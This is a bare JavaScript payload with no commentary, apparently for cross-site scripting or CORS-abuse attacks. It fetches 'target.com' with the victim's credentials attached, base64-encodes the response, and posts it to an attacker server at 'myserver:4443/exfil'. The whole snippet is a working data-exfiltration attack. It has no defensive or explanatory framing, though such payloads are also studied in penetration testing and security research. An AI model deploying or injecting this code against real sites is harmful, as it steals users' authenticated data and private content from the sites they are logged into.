try {
	var xhr = new XMLHttpRequest();
	xhr.open('GET', 'https://target.com', false);
	xhr.withCredentials = true;
	xhr.send();
	var msg = xhr.responseText;
} catch (error) {
	var msg = error;
}

var exfil = new XMLHttpRequest();
exfil.open("POST", "https://myserver:4443/exfil", false);
exfil.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
exfil.send("d=" + encodeURIComponent(btoa(msg)));